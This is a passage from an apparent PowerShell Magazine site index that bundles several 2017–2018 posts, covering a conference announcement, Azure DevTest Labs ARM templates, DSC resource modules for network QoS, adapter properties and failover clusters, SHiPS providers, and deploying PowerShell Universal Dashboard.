drive robust methodology-based detection development (“DevSec Defense: How DevOps Practices Can Drive Detection Development For Defenders”)\nWill Schroeder, one of the contributors of the “PowerShell Empire” post-exploitation agent, together with Jared Atkinson and Matt Graeber, sets up one of the three coding workshops on day 2 where you can get hands-on experience and learn how to check for security breaches in your own IT infrastructure.\nPlain Good Old PowerShell Knowledge Not every session is dead serious. The entire event is designed to have fun. Here are just a couple of sessions that are a bit eerie: Bartosz Bielawski dives into “PowerShell Yin-Yang: The Worst Practices and Tips \u0026amp; Tricks”: Every Yin has its Yang. Every Jedi has her Sith. Every bad practice can be balanced with an awesome trick. Join me to see the darkest places of PowerShell scripting universe so that you know what to avoid! Get to know tricks that will impress your peers and tips that will make your life easier!\nAt PSConfEU17, Mathias Jessen talked about regex, and some of its common applications. This year, he’ll dive straight-first into some of the most bizarre functions .NET regex offers – the outer edge cases. Staffan Gustafsson takes a deep look into the PowerShell type system, including examples on how you can use it to adapt standard and third party types to your own situation and workflow. And Jared Atkinson investigates .NET reflection and how to access the Windows API from within PowerShell.\nSo to wrap it up, we’d love to welcome you in Hanover! To register and reserve your seat, or review the agenda, please visit www.psconf.eu. Should you have any questions, please drop me a mail at tobias@powertheshell.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/02/09/powershell-conference-eu-2018/","tags":["Conferences"],"title":"PowerShell Conference EU 2018"},{"categories":["Azure","Azure DevTest"],"contents":"Unless you were living under a rock, PowerShell Core general availability isn’t any breaking news.\n PowerShell Core is a cross-platform (Windows, Linux, and macOS) automation and configuration tool/framework that works well with your existing tools and is optimized for dealing with structured data (e.g. JSON, CSV, XML, etc.), REST APIs, and object models. It includes a command-line shell, an associated scripting language and a framework for processing cmdlets.\n Some time in 2016, I published the Azure DevTest Labs artifact for installing PowerShell for Linux on Azure Linux virtual machines. Similar to this, I have now created a new artifact for installing PowerShell Core on Windows VMs in Azure. This new artifact is still not in the official artifacts repository and it is in my GitHub repository. Therefore, to be able to use this, you need to fork my repository and add it as an external repository source in your Azure DevTest lab.\nOnce this custom repository is added, here is how you use the PowerShell Core artifact.\nSelect the Virtual Machines blade in the Azure DevTest Labs.\nClick the VM, and then click on Artifacts and Apply Artifacts. In the search box, type PowerShell Core, and then click on the result in the Apply Artifacts blade.\nClick on the artifact and supply the parameters required.\nPackage URL – The MSI URL for installing PowerShell Core. You can retrieve this from https://github.com/PowerShell/PowerShell/releases.\nInstall C runtime for Windows OS prior to Windows Server 2016? – Select True for Windows Server 2012 R2 or select False. This is needed for Windows Server 2012 R2 if you want to use WinRM for PowerShell remoting.\nClick Add. This artifact installation might take a few minutes and once complete, you can access the install script verbose logs.\nThis is it. You can, of course, install these artifacts (Windows or Linux) at the time of Azure DTL VM provisioning itself. And, you can do this deployment via an ARM template as well.\n{ \u0026#34;$schema\u0026#34;: \u0026#34;https://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json\u0026#34;, \u0026#34;contentVersion\u0026#34;: \u0026#34;1.0.0.0\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;newVMName\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;defaultValue\u0026#34;: \u0026#34;PSCore1601\u0026#34; }, \u0026#34;labName\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;defaultValue\u0026#34;: \u0026#34;PSMagDTL\u0026#34; }, \u0026#34;size\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;defaultValue\u0026#34;: \u0026#34;Standard_A6\u0026#34; }, \u0026#34;userName\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;defaultValue\u0026#34;: \u0026#34;ravikanth\u0026#34; }, \u0026#34;password\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;securestring\u0026#34; }, \u0026#34;PowerShell_Core_a.k.a_PowerShell_6_packageUrl\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;defaultValue\u0026#34;: \u0026#34;https://github.com/PowerShell/PowerShell/releases/download/v6.0.0/PowerShell-6.0.0-win-x64.msi\u0026#34; }, \u0026#34;PowerShell_Core_a.k.a_PowerShell_6_installCRuntime\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;bool\u0026#34;, \u0026#34;defaultValue\u0026#34;: false }, \u0026#34;labVirtualNetworkName\u0026#34; : { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34; }, \u0026#34;labSubnetName\u0026#34; : { \u0026#34;type\u0026#34; : \u0026#34;string\u0026#34; } }, \u0026#34;variables\u0026#34;: { \u0026#34;labVirtualNetworkId\u0026#34;: \u0026#34;[resourceId(\u0026#39;Microsoft.DevTestLab/labs/virtualnetworks\u0026#39;, parameters(\u0026#39;labName\u0026#39;), parameters(\u0026#39;labVirtualNetworkName\u0026#39;))]\u0026#34;, \u0026#34;vmId\u0026#34;: \u0026#34;[resourceId (\u0026#39;Microsoft.DevTestLab/labs/virtualmachines\u0026#39;, parameters(\u0026#39;labName\u0026#39;), parameters(\u0026#39;newVMName\u0026#39;))]\u0026#34;, \u0026#34;vmName\u0026#34;: \u0026#34;[concat(parameters(\u0026#39;labName\u0026#39;), \u0026#39;/\u0026#39;, parameters(\u0026#39;newVMName\u0026#39;))]\u0026#34; }, \u0026#34;resources\u0026#34;: [ { \u0026#34;apiVersion\u0026#34;: \u0026#34;2017-04-26-preview\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;Microsoft.DevTestLab/labs/virtualmachines\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;[variables(\u0026#39;vmName\u0026#39;)]\u0026#34;, \u0026#34;location\u0026#34;: \u0026#34;[resourceGroup().location]\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;labVirtualNetworkId\u0026#34;: \u0026#34;[variables(\u0026#39;labVirtualNetworkId\u0026#39;)]\u0026#34;, \u0026#34;notes\u0026#34;: \u0026#34;Windows Server 2016 Datacenter\u0026#34;, \u0026#34;galleryImageReference\u0026#34;: { \u0026#34;offer\u0026#34;: \u0026#34;WindowsServer\u0026#34;, \u0026#34;publisher\u0026#34;: \u0026#34;MicrosoftWindowsServer\u0026#34;, \u0026#34;sku\u0026#34;: \u0026#34;2016-Datacenter\u0026#34;, \u0026#34;osType\u0026#34;: \u0026#34;Windows\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;latest\u0026#34; }, \u0026#34;size\u0026#34;: \u0026#34;[parameters(\u0026#39;size\u0026#39;)]\u0026#34;, \u0026#34;userName\u0026#34;: \u0026#34;[parameters(\u0026#39;userName\u0026#39;)]\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;[parameters(\u0026#39;password\u0026#39;)]\u0026#34;, \u0026#34;isAuthenticationWithSshKey\u0026#34;: false, \u0026#34;artifacts\u0026#34;: [ { \u0026#34;artifactId\u0026#34;: \u0026#34;[resourceId(\u0026#39;Microsoft.DevTestLab/labs/artifactSources/artifacts\u0026#39;, parameters(\u0026#39;labName\u0026#39;), \u0026#39;privaterepo596\u0026#39;, \u0026#39;windows-powershellcore\u0026#39;)]\u0026#34;, \u0026#34;parameters\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;packageUrl\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;[parameters(\u0026#39;PowerShell_Core_a.k.a_PowerShell_6_packageUrl\u0026#39;)]\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;installCRuntime\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;[parameters(\u0026#39;PowerShell_Core_a.k.a_PowerShell_6_installCRuntime\u0026#39;)]\u0026#34; } ] } ], \u0026#34;labSubnetName\u0026#34;: \u0026#34;[parameters(\u0026#39;labSubnetName\u0026#39;)]\u0026#34;, \u0026#34;disallowPublicIpAddress\u0026#34;: true, \u0026#34;storageType\u0026#34;: \u0026#34;Standard\u0026#34;, \u0026#34;allowClaim\u0026#34;: false, \u0026#34;networkInterface\u0026#34;: { \u0026#34;sharedPublicIpAddressConfiguration\u0026#34;: { \u0026#34;inboundNatRules\u0026#34;: [ { \u0026#34;transportProtocol\u0026#34;: \u0026#34;tcp\u0026#34;, \u0026#34;backendPort\u0026#34;: 3389 } ] } } } } ], \u0026#34;outputs\u0026#34;: { \u0026#34;labVMId\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;[variables(\u0026#39;vmId\u0026#39;)]\u0026#34; } } } At the end of this template deployment, you will have a Windows Server 2016 VM with PowerShell Core installed.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/01/22/azure-devtest-labs-artifact-for-installing-powershell-core/","tags":["Azure","Azure DevTest"],"title":"Azure DevTest Labs Artifact for installing PowerShell Core"},{"categories":["Feedback"],"contents":"If you have ever used Node.js, the packages.json file is used to specify the module dependencies. Here is an example:\n{ \u0026#34;name\u0026#34;: \u0026#34;MyNodeJSApp\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;First Node JS Application\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;author\u0026#34;: \u0026#34;Ravikanth Chaganti\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;MIT\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;express\u0026#34;: \u0026#34;^4.16.2\u0026#34; } } In the above snippet, line 12 specifies express module with a version string ^4.16.2. The version string here is prefixed with a caret (^) symbol. NPM supports different specification strings. We can prefix the version string with a tilde (~) as well or simply use an asterisk (*) to mean the most recent version or latest version of the module. Through the use of version range comparators, version can be specified in multiple ways. The node-semver repository provides in-depth view into this.\nFrom the node-semver page,\nA comparator is composed of an operator and a version. The set of primitive operators is:\n \u0026lt; Less than \u0026lt;= Less than or equal to \u0026gt; Greater than \u0026gt;= Greater than or equal to = Equal. If no operator is specified, then equality is assumed, so this operator is optional, but MAY be included.  For example, the comparator \u0026gt;=1.2.7 would match the versions 1.2.7, 1.2.8, 2.5.3, and 1.3.9, but not the versions 1.2.6 or 1.1.0.\nThe tilde (~) and caret (^) ranges can be used as well.\nX-Ranges 1.2.x 1.X 1.2.* * Any of X, x, or * may be used to “stand in” for one of the numeric values in the [major, minor, patch] tuple.\n * := \u0026gt;=0.0.0 (Any version satisfies) 1.x := \u0026gt;=1.0.0 \u0026lt;2.0.0 (Matching major version) 1.2.x := \u0026gt;=1.2.0 \u0026lt;1.3.0 (Matching major and minor versions)  Tilde Ranges ~1.2.3 ~1.2 ~1 Allows patch-level changes if a minor version is specified on the comparator. Allows minor-level changes if not.\nCaret Ranges ^1.2.3 ^0.2.5 ^0.0.4 Allows changes that do not modify the left-most non-zero digit in the [major, minor, patch] tuple. In other words, this allows patch and minor updates for versions 1.0.0 and above, patch updates for versions 0.X \u0026gt;=0.1.0, and no updates for versions 0.0.X.\nPowerShell UserVoice Coming to the subject of this article, having similar support in PowerShell module manifests and with #Requires statement, we can specify the module dependencies in a more flexible way. To this extent, I have created a UserVoice item: https://windowsserver.uservoice.com/forums/301869-powershell/suggestions/32845762-support-for-npm-type-version-strings-in-powershell\nIf you think this is useful feature in PowerShell, go ahead and vote it up!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/01/08/powershell-user-voice-add-support-for-npm-type-version-specification-in-module-manifest-and-requires/","tags":["Modules"],"title":"PowerShell UserVoice: Add Support for NPM Type Version Specification in Module Manifest and #Requires"},{"categories":["PowerShell DSC","DevOps"],"contents":"When we talk about applications or software deployed in the infrastructure, we simply refer to the version of the application or software running in the infrastructure. At any point in time, we can look at the installed service or software and understand what version of that is currently running on the system, we need to remember that selling is service not sales . How about your node configurations? Does your node tell you what version of the configuration it is currently using?\nFor example, consider that you have a set of web server nodes and each configured using PowerShell DSC. As a part of the initial configuration, you deployed a set of web applications on the node. And, at some point in time later, you made multiple changes to the node configuration in terms of adding or removing web applications and updating application configurations. If multiple such source controlled configurations are deployed on each of these nodes, how exactly do you figure out what version of the node configuration is being used on each of the nodes? This can probably be achieved by a complete suite of tools but is there a way, today, you can do this by querying the node itself? The answer is no. At least, in the PowerShell DSC world.\nOne of the core concepts of Infrastructure as Code (IaC) is to version/source control your infrastructure configurations so that it becomes easy to track what version of the configuration a target node has and rollback to last known working configuration when needed. But, the compiled DSC MOF files do not carry this information today nor they are aware of any source / version control systems. They need not be aware as well.\nAt this point in time, I track my node configuration version by adding a DSC resource that caches the node configuration version information. As a part of the build process, I can update the version of the configuration using this DSC resource. When I need to know what version of configuration a node is using, I simply invoke the Get-DscConfiguration cmdlets. to verify that.\nI packaged this DSC resource into a module of its own and published in my Github account.\nConfigurationDSC resource module Through the ConfigurationDSC resource module, I plan to combine various resources that help in managing DSC based configurations in deployment pipeline. At this point in time, there is only one resource, ConfigurationVersion, which helps in tracking the version of the configuration document. Here is an example of a configuration document with the ConfigurationVersion DSC resource.\nConfiguration VersionedConfiguration { param ( [Parameter(Mandatory = $true)] [String] $ConfigurationName, [Parameter(Mandatory = $true)] [String] $ConfigurationVersion ) Import-DscResource -ModuleName PSDesiredStateConfiguration -ModuleVersion 1.1 Import-DscResource -ModuleName ConfigurationDsc -ModuleVersion 1.0.0.0 ConfigurationVersion WebServerConfiguration { Name = $ConfigurationName Version = $ConfigurationVersion } WindowsFeature WebServer { Name = \u0026#39;Web-Server\u0026#39; IncludeAllSubFeature = $true Ensure = \u0026#39;Present\u0026#39; } } VersionedConfiguration -ConfigurationName \u0026#39;WebServerConfig\u0026#39; -ConfigurationVersion \u0026#39;1.0.0.0\u0026#39; Once this configuration is enacted, I can use the Get-DscConfiguration cmdlet to find the version of the node configuration.\nGet-DscConfiguration | Where-Object { $_.CimClassName -eq \u0026#39;ConfigurationVersion\u0026#39; } | Select -ExpandProperty Version What I have shown here is only a workaround. This approach has both pros and cons. I rather want this added into the existing DSC feature set. If you see a compiled MOF, it has a few configuration meta properties. For example, from the above example, the compiled MOF has the following instance of the MSFT_ConfigurationDocument class in the MOF.\ninstance of OMI_ConfigurationDocument { Version=\u0026#34;2.0.0\u0026#34;; MinimumCompatibleVersion = \u0026#34;1.0.0\u0026#34;; CompatibleVersionAdditionalProperties= {\u0026#34;Omi_BaseResource:ConfigurationName\u0026#34;}; Author=\u0026#34;Administrator\u0026#34;; GenerationDate=\u0026#34;01/05/2018 11:07:56\u0026#34;; GenerationHost=\u0026#34;MGMT01\u0026#34;; Name=\u0026#34;VersionedConfiguration\u0026#34;; }; It would be ideal for us to be able to add the configuration version from the source / version control system to this instance of OMI_ConfigurationDocument. I created an user voice item for this: https://windowsserver.uservoice.com/forums/301869-powershell/suggestions/32825272-enable-configuration-version-tracking-for-compiled\nGo ahead and it vote it up if you think this will be useful in your infrastructure as well.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/01/05/psdsc-configuration-versioning-in-a-deployment-pipeline/","tags":["DevOps","PowerShell DSC"],"title":"#PSDSC Configuration Versioning in a Deployment Pipeline"},{"categories":["Module Spotlight","PowerShell DSC"],"contents":"At times we need to set the physical adapter advanced properties such as VLAN ID. This can be done using the Set-NetAdapterAdvancedProperty cmdlet. However, when using DSC-based configuration management, it makes sense to configure these advanced properties as well using DSC resource modules. Within the automation that I have been working on for automated deployments of Storage Spaces Direct clusters, I have the need for setting adapter advanced properties and that is what triggered me to write this new resource module — NetworkAdapterProperty. This is a part of the NetworkingDSC module.\n This is not a fork of the xNetworking module. I am adding only the resources that I am developing from scratch to this NetworkingDsc. These resources will follow the HQRM guidelines.\n This resource requires the display name of the network adapter and it can be seen by using the Get-NetAdapterAdvancedProperty cmdlet. Depending on what the network adapter driver implements, this list changes between different network adapter models/vendors. Let’s see a couple of examples of using this resource.\nConfiguring VLAN ID advanced property The display name of the advanced property for VLAN configuration on physical adapter is usually VLAN ID.\nConfiguration PhysicalAdapterVLAN { Import-DscResource -ModuleName PSDesiredStateConfiguration -ModuleVersion 1.1 Import-DscResource -ModuleName NetworkingDsc -ModuleVersion 1.0.0.0 NetworkAdapterProperty VLAN { Id = \u0026#39;S1P1VLAN\u0026#39; Name = \u0026#39;SLOT 1 PORT 1\u0026#39; DisplayName = \u0026#39;VLAN ID\u0026#39; DisplayValue = \u0026#39;102\u0026#39; Ensure = \u0026#39;Present\u0026#39; } } Configuring DCBX Mode on Mellanox CX4 adapters This following example is specific to Mellanox CX4 adapters. These adapters support firmware or host controlled DCB exchange. We can configure this by changing the value of DcbxMode property.\nConfiguration PhysicalAdapterVLAN { Import-DscResource -ModuleName PSDesiredStateConfiguration -ModuleVersion 1.1 Import-DscResource -ModuleName NetworkingDsc -ModuleVersion 1.0.0.0 NetworkAdapterProperty S1P1DCBX { Id = \u0026#39;S1P1DCBX\u0026#39; Name = \u0026#39;SLOT 1 PORT 1\u0026#39; DisplayName = \u0026#39;DcbxMode\u0026#39; DisplayValue = \u0026#39;Host in charge\u0026#39; Ensure = \u0026#39;Present\u0026#39; } NetworkAdapterProperty S1P2DCBX { Id = \u0026#39;S2P2DCBX\u0026#39; Name = \u0026#39;SLOT 1 PORT 2\u0026#39; DisplayName = \u0026#39;DcbxMode\u0026#39; DisplayValue = \u0026#39;Host in charge\u0026#39; Ensure = \u0026#39;Present\u0026#39; } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/01/04/using-networkadapterproperty-psdsc-resource-to-configure-network-adapter-advanced-properties/","tags":["Modules","PowerShell DSC"],"title":"Using NetworkAdapterProperty #PSDSC Resource to Configure Network Adapter Advanced Properties"},{"categories":["PowerShell DSC","Module Spotlight"],"contents":"As a part of larger hyper-converged infrastructure (based on S2D) configuration automation using PowerShell DSC, I have written quite a few new DSC resource modules. FailoverClusterDSC was one of the modules in that list. I added NetQoSDSC as well to ensure I have the automated means to configure the QoS policies in Windows Server 2016.\nThis module contains five resources at the moment.\nEnable/Disable Network Adapter QoS The NetAdapterQoS resource can be used to enable/disable QoS a specific network adapter.\nConfiguration NetAdapterQoS { Import-DscResource -ModuleName PSDesiredStateConfiguration -ModuleVersion 1.1 Import-DscResource -ModuleName NetQoSDSC -ModuleVersion 1.0.0.0 NetAdapterQoS EnableAdapterQoS { NetAdapterName = \u0026#39;Storage1\u0026#39; Ensure = \u0026#39;Present\u0026#39; } } Enable/Disable DCBX Willing mode DCBX willing mode can be enabled or disabled using the NetQoSDCBXSetting resource. This can be done at an interface level or at the global level in the operating system.\nConfiguration DisableGlobalDCBX { Import-DscResource -ModuleName PSDesiredStateConfiguration -ModuleVersion 1.1 Import-DscResource -ModuleName NetQosDsc -ModuleVersion 1.0.0.0 NetQoSDcbxSetting DisableGlobal { InterfaceAlias = \u0026#39;Global\u0026#39; Willing = $false } NetQoSDcbxSetting EnableStorage1 { InterfaceAlias = \u0026#39;Storage1\u0026#39; Willing = $true } } Enable/Disable Network QoS flow control priorities The NetQosFlowControl resource can be used to enable or disable 802.1P flow control priorities.\nConfiguration NetQoSFlowControl { Import-DscResource -ModuleName PSDesiredStateConfiguration -ModuleVersion 1.1 Import-DscResource -ModuleName NetQoSDSC -ModuleVersion 1.0.0.0 NetQoSFlowControl EnableP3 { Id = \u0026#39;Priority3\u0026#39; Priority = 3 Enabled = $true } NetQoSFlowControl DisableRest { Id = \u0026#39;RestPriority\u0026#39; Priority = @(0,1,2,4,5,6,7) Enabled = $false } } Create new QoS policies New network QoS policies can be created using the NetQoSPolicy resource.\nConfiguration NewNetQoSPolicy { Import-DscResource -ModuleName PSDesiredStateConfiguration -ModuleVersion 1.1 Import-DscResource -ModuleName NetQoSDSC -ModuleVersion 1.0.0.0 NetQosPolicy SMB { Name = \u0026#39;SMB\u0026#39; PriorityValue8021Action = 3 PolicyStore = \u0026#39;localhost\u0026#39; NetDirectPortMatchCondition = 445 Ensure = \u0026#39;Present\u0026#39; } } Manage Network QoS Traffic classes The NetQoSTrafficClass resource can be used to manage the traffic classes in network QoS.\nConfiguration NewTrafficClass { Import-DscResource -ModuleName PSDesiredStateConfiguration -ModuleVersion 1.1 Import-DscResource -ModuleName NetQoSDSC -ModuleVersion 1.0.0.0 NetQosTrafficClass SMB { Name = \u0026#39;SMB\u0026#39; Algorithm = \u0026#39;ETS\u0026#39; Priority = 3 BandwidthPercentage = 50 Ensure = \u0026#39;Present\u0026#39; } } This module, while code complete, needs some more work to declare as fully HQRM-compliant. I am working towards that by adding tests and better examples. Feel free to submit your issues, feedback, or PRs.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/01/03/using-netqosdsc-psdsc-resource-module-to-configure-network-qos/","tags":["PowerShell DSC","Modules"],"title":"Using NetQoSDSC #PSDSC Resource Module to Configure Network QoS"},{"categories":["Module Spotlight","SHiPS"],"contents":"In an earlier article, I had written about a PowerShell provider for Failover Clusters written using the SHiPS provider framework. I have been experimenting with this a bit and made a few more providers.\nIn today’s article, I am introducing the Hyper-V Server PowerShell provider.\nUsing this provider, you can connect to local and remote Hyper-V hosts and browse the virtual machines and virtual networks as if they are folders on a file system.\nOnce again, like every other provider I am writing, this is experimental as well. I am writing these to understand what needs to be considered as part of the provider design and implementation. So, the final version of these providers may look and function differently.\n  TODO:   \u0026#8211; Add support for Hyper-V Host properties as leaf   \u0026#8211; Fix support for using the module on a system with RSAT-ClusteringTools and not a Hyper-V host.   \u0026#8211; Add formats for better output   Follow the Github repository for information on any future updates.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2018/01/02/hyper-v-server-powershell-drive-based-on-ships/","tags":["Modules","SHiPS"],"title":"Hyper-V Server PowerShell Drive based on #SHiPS"},{"categories":["Module Spotlight","SHiPS"],"contents":"Simple Hierarchy in PowerShell (SHiPS) is a module that simplifies implementing PowerShell providers. If you are new to PowerShell providers, a PowerShell provider allows any data store to be exposed like a file system as if it were a mounted drive. In other words, the data in your data store can be treated like files and directories so that a user can navigate data via Set-Location (cd) and Get-ChildItem (dir or ls).\nI have been looking at this and experimenting with a few providers of my own. I will write more about how to approach writing a PowerShell provider using SHiPS but wanted to give you a sneak peek into the Failover Cluster PowerShell Drive (FailoverClusterDrive).\nHere is the Failover Cluster PowerShell Drive in action.\nThis is still an experimental module. SHiPS currenly supports only get actions. So, the mounted failover cluster drive will only be read-only. There are a few more additions I am still working on in my free time and I will push another release early next year.\n  TODO  * Add support for Cluster Storage as a container * Add support for browsing cluster resource parameters as a container * Fix support for using the module on a system with RSAT-ClusteringTools and not a cluster node. * Add formats for better output Stay tuned!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/12/21/failover-cluster-powershell-drive-based-on-ships/","tags":["Modules","SHiPS"],"title":"Failover Cluster PowerShell Drive based on #SHiPS"},{"categories":["PowerShell DSC","Module Spotlight"],"contents":"I have been working on the FailoverClusterDsc resource module and finally had the chance to add some examples and make the repository public.\n This is not a fork of the xFailoverCluster module. I am adding only the resources that I am developing from scratch to this module. These resources will follow the HQRM guidelines.\n You can take a look at each of these resources to check what different configuration options are supported as of today.\nHere is an example of creating and configuring a Storage Spaces Direct cluster.\n$configData = @{ AllNodes = @( @{ NodeName = \u0026#39;localhost\u0026#39; thumbprint = \u0026#39;25A1359A27FB3F2D562D7508D98E7189F2A1F1B0\u0026#39; CertificateFile = \u0026#39;C:\\PublicKeys\\S2D4N01.cer\u0026#39; PsDscAllowDomainUser = $true } ) } Configuration CreateS2DCluster { param ( [Parameter(Mandatory = $true)] [pscredential] $Credential, [Parameter(Mandatory = $true)] [String[]] $ParticipantNodes, [Parameter(Mandatory = $true)] [String] $ClusterName, [Parameter(Mandatory = $true)] [String] $StaticAddress, [Parameter(Mandatory = $true)] [String[]] $IgnoreNetworks, [Parameter(Mandatory = $true)] [String] $QuorumResource, [Parameter(Mandatory = $true)] [String] $QuorumType ) Import-DscResource -ModuleName FailoverClusterDsc Node $AllNodes.NodeName { FailoverCluster CreateCluster { ClusterName = $ClusterName StaticAddress = $StaticAddress NoStorage = $true IgnoreNetwork = $IgnoreNetworks Ensure = \u0026#39;Present\u0026#39; PsDscRunAsCredential = $Credential } WaitForFailoverCluster WaitForCluster { ClusterName = $ClusterName PsDscRunAsCredential = $Credential } Foreach ($node in $ParticipantNodes) { FailoverClusterNode $node { NodeName = $node ClusterName = $ClusterName PsDscRunAsCredential = $Credential Ensure = \u0026#39;Present\u0026#39; } } FailoverClusterQuorum FileShareQuorum { IsSingleInstance = \u0026#39;Yes\u0026#39; QuorumType = $QuorumType Resource = $QuorumResource } FailoverClusterS2D EnableS2D { IsSingleInstance = \u0026#39;yes\u0026#39; Ensure = \u0026#39;Present\u0026#39; } } } CreateS2DCluster -Credential (Get-Credential) -ConfigurationData $configData ` -QuorumType \u0026#39;NodeAndFileShareMajority\u0026#39; ` -QuorumResource \u0026#39;\\\\sofs\\share\u0026#39; ` -ClusterName \u0026#39;S2D4NCluster\u0026#39; ` -StaticAddress \u0026#39;172.16.102.45\u0026#39; ` -IgnoreNetworks @(\u0026#39;172.16.103.0/24\u0026#39;,\u0026#39;172.16.104.0/24\u0026#39;) ` -ParticipantNodes @(\u0026#39;S2D4N02\u0026#39;,\u0026#39;S2D4N03\u0026#39;,\u0026#39;S2D4N04\u0026#39;) In the above pattern, I am creating a failover cluster and then adding the remaining nodes using the same configuration document. You can, however, have the node addition configuration using the FailoverClusterNode resource as a separate configuration document that gets enacted on the participant node.\nThe failover cluster configuration requires administrator privileges and these resources do not have a Credential parameter of their own and depend on PSDscRunAsCredential. Therefore, you need at least PowerShell 5.0 to use these resources.\nI am looking at expanding the resource modules to beyond what is there at the moment. If you see any issues or have feedback, feel free to create an issue in my repository. These resources lack tests today. I would be glad to accept any PRs for tests.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2017/12/19/psdsc-failoverclusterdsc-deploy-a-storage-spaces-direct-cluster/","tags":["PowerShell DSC","Modules"],"title":"#PSDSC FailoverClusterDSC – Deploy a Storage Spaces Direct Cluster"},{"categories":["Containers","How To"],"contents":"In this article, we will look at different options for containerizing a web application.\nWe will go through the following deployment scenarios, going from traditional options to cloud services and containers:\n Deploy to local machine Deploy to an Infrastructure as a Service (IaaS) VM Deploy to a Platform as a Service (PaaS) website Deploy to a container running Windows Server Core Deploy to a container running Nano Server  Our example application is the PowerShell Universal Dashboard – a web application built on ASP .NET Core, PowerShell Core, ReactJS, and a handful of JavaScript libraries.\nThis means it can support cross-platform deployments, running on Windows, Linux, and macOS.\nThat is already a very flexible range of options, but we can get even more options by using containers.\nThe PowerShell Universal Dashboard PowerShell module allows for creation of web-based dashboards. The client- and server-side code for the dashboard is authored completely with PowerShell. Charts, monitors, tables and grids can easily be created with the cmdlets included in the module. The module is a cross-platform module and will run anywhere PowerShell Core can run.\nDeployment options ** **\nDeploy to local machine Let us first look at how to install and setup the application locally on a client machine.\nInstall the UniversalDashboard module from the PowerShell Gallery using PowerShellGet:\nInstall-Module UniversalDashboard\nWhen the module is installed you will have access to a number of new commands:\nStart-UDDashboard is the main command for starting a new instance of a dashboard.\nFor the example usage of the other commands, I would encourage you to have a look at the Components section of the beforementioned demo website.\nThe example dashboard I am going to use for this article is one from a real-world scenario. During an onboarding process, there was a need to gather some data (an employee number) from an external company. The link was to an instance of PowerShell Universal Dashboard, which would take the input from the external user and send it as a parameter to an Azure Automation webhook. The webhook would start an Azure Automation runbook, which would register the data in the internal system.\nThe dashboard for this scenario is available in this Gist.\nWhen the UniversalDashboard PowerShell module is installed, we can simply run the dashboard.ps1 script to start the dashboard. Here is a screenshot from performing this in Visual Studio Code:\nAt this point, the website should be up and running. We can test by navigating to http://localhost/register/123\nIn this example, we are also taking input from the URL. 123 can be any number (in the example scenario, a service request ID), and will be available as a parameter variable in the New-UDInput command.\nAt this point, we have the application up and running on a local computer as a PowerShell module. For production use, we want to run this on a server platform.\nAs stated in the product documentation, the PowerShell Universal Dashboard can be hosted in Azure or IIS:\nTo host a dashboard in Azure or IIS, you will need to deploy the entire module to your site or WebApp. In the root module directory, place your dashboard.ps1. You need to specify the -Wait parameter on Start-UDDashboard so that the script blocks and waits for requests in Azure or IIS. Specifying the port isn’t necessary because Azure and IIS use dynamic port tunneling.\nIIS requires that the ASP.NET Core module is installed.** **\nDeploy to an Infrastructure as a Service (IaaS) VM running Internet Information Services (IIS) The other option would be to simply run the website in IIS on a Windows Server which can run anywhere: on-premises, a public cloud, or a hosting provider.\nIn this example, we are using a virtual machine running in Azure based on the Azure Marketplace Windows Server Datacenter, version 1709 image.\nStep 1 – Install the web server role: Install-WindowsFeature -Name Web-Server\nStep 2 – Install the .NET Core Windows Server Hosting bundle as described here (needed since the PowerShell Universal Dashboard is built on .NET Core and not the built-in .NET Desktop edition).\nStep 3 – Copy the UniversalDashboard PowerShell module to the path where the website is running, for example C:\\inetpub\\wwwroot if the Default Web Site is leveraged.\nStep 4 – Copy the dashboard.ps1 and license.lic files to the same directory:\nThat`s it – at this point the website should be up and running.\nDeploy to a Platform as a Service (PaaS) website The route for the mentioned real-world scenario was to host the module in a public cloud service, in this case Azure App Service:\nThere are many different options for deploying a web application to an instance of Azure App Service. Microsoft has provided some examples for us to use:\n Create a web app with deployment from GitHub Create a web app with continuous deployment from GitHub Create a web app and deploy code with FTP Create a web app and deploy code from a local Git repository Create a web 